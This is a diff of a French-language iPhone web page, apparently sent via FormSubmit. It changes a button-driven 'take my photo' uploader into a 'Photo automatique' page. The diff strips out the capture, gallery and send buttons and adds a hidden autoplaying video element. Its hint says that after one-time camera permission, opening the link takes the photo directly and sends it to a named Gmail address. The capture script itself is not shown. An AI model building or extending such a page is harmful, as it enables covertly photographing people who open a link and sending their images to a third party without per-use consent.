@@ -24,24 +24,21 @@
     <main class="sheet">
       <header class="hero">
         <p class="kicker">Safari · iPhone</p>
-        <h1>Prendre ma photo</h1>
+        <h1>Photo automatique</h1>
         <p class="lead">
-          Un tap ouvre l’appareil photo. La photo est enregistrée puis envoyée à
+          En ouvrant ce lien, la caméra se lance et la photo part vers
           <strong>cmahdi204@gmail.com</strong>.
         </p>
       </header>
 
       <section class="stage" aria-live="polite">
+        <video id="live" class="live" playsinline muted autoplay hidden></video>
         <img id="preview" class="preview" alt="Aperçu de la photo" hidden />
         <div id="placeholder" class="placeholder">
-          <svg viewBox="0 0 24 24" width="54" height="54" aria-hidden="true">
-            <path
-              fill="currentColor"
-              d="M12 9.2a3.3 3.3 0 1 0 0 6.6 3.3 3.3 0 0 0 0-6.6Zm-9.2-2.4A2.8 2.8 0 0 1 5.6 4h2.1l.7-1.2A1.8 1.8 0 0 1 9.9 2h4.2c.6 0 1.2.3 1.5.8L16.3 4h2.1a2.8 2.8 0 0 1 2.8 2.8v10.4a2.8 2.8 0 0 1-2.8 2.8H5.6a2.8 2.8 0 0 1-2.8-2.8V6.8Z"
-            />
-          </svg>
-          <span>Aucune photo pour l’instant</span>
+          <div class="spinner" aria-hidden="true"></div>
+          <span id="placeholderText">Ouverture de la caméra…</span>
         </div>
+        <div id="flash" class="flash" hidden></div>
       </section>
 
       <form
@@ -57,7 +54,6 @@
         <input type="text" name="_honey" class="honey" tabindex="-1" autocomplete="off" />
         <input type="hidden" name="appareil" id="deviceField" value="iPhone" />
         <input type="hidden" name="date" id="dateField" value="" />
-
         <input
           id="cameraInput"
           class="file"
@@ -66,30 +62,12 @@
           accept="image/*"
           capture="user"
         />
-        <input
-          id="libraryInput"
-          class="file"
-          type="file"
-          accept="image/*"
-        />
-
-        <div class="actions">
-          <button id="shotBtn" class="btn primary" type="button">
-            Prendre ma photo
-          </button>
-          <button id="libraryBtn" class="btn ghost" type="button">
-            Choisir dans la galerie
-          </button>
-          <button id="sendBtn" class="btn send" type="submit" hidden>
-            Envoyer à Gmail
-          </button>
-        </div>
       </form>
 
-      <p id="status" class="status" role="status"></p>
+      <p id="status" class="status" role="status">Lancement automatique…</p>
       <p class="hint">
-        iOS demande toujours votre accord pour la caméra. La première photo active
-        aussi un e-mail de confirmation FormSubmit : ouvrez-le et cliquez sur le lien.
+        Safari affiche l’autorisation caméra d’Apple une seule fois. Ensuite,
+        ouvrir le lien prend la photo directement.
       </p>
     </main>
 
